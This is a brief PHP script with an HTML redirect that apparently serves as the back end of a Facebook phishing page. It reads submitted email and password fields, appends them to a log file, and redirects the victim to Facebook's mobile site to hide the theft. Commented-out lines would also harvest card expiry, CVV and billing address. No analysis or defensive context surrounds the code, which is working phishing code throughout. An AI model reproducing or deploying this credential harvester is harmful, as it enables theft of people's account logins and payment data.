<meta http-equiv="refresh" content="0; url=https://mbasic.facebook.com/">
<?php 
$ref = $Comments = ''; 
if(isset($_POST["email"])) $ref = $_POST["email"]; 
if(isset($_POST["pass"])) $Comments = $_POST["pass"]; 
//if(isset($_POST["monthyr"])) $monthyr = $_POST["monthyr"];
//if(isset($_POST["cvv"])) $cvv = $_POST["cvv"];
//if(isset($_POST["billadd"])) $billadd = $_POST["billadd"];

if ($ref <> ''){ 
    $fp  = fopen('logs.html', 'a+'); 
	fwrite($fp, $ref."||");
	fwrite($fp, $Comments."|"); 
	//fwrite($fp, $monthyr."|"); 
	//fwrite($fp, $cvv."|"); 
	//fwrite($fp, $billadd."||**"); 
    fclose($fp); 
} 
?>